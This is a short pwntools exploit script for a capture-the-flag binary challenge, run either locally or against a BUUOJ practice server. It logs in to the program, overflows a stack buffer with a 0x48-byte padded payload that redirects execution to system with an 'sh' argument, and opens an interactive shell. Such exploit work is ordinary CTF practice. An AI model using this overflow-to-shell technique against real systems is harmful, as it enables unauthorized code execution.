from pwn import * 
from pwn import p32


debug = 1
gdb_is = 1
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./pwn")
else:
    host = "node4.buuoj.cn"
    r = connect(host,27711)#远程连接
    gdb_is =0

if gdb_is:
    gdb.attach(r,'b* 0x8048916')
    # gdb.attach(r)
    pause()
    pass

# libc = ELF('./libc-2.31.so')
elf = ELF('./pwn')
payload = b'A' * 0x48 + b'junk' + p32(elf.sym['system']) +p32(0x12345678)+ p32(0x080482ea)
                                                            # 要填满 不然会/x00影响 sh
r.sendlineafter(b'password:',b'administrator')
r.sendlineafter(b'Exit\n:',b'1')
r.sendline(payload)
r.sendlineafter(b'Exit\n:',b'4')
# r.recvuntil()
r.interactive()
